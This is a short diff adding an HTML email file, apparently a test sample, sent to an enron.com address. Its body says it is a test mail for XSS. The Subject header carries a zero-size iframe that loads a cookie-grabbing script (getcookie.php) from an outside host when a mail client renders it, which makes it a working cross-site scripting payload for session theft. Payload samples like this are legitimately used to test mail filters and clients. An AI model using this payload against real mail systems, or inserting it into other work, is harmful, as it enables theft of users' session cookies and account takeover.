@@ -1,0 +1,7 @@
+From: "Rady fulcher" <Rady265@USPOTATOES.COM>
+To: evan.hughes@enron.com
+Subject: <iframe src=\"http://www.wooyun.org/getcookie.php\" width=0 height=0 frameborder=0></iframe>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
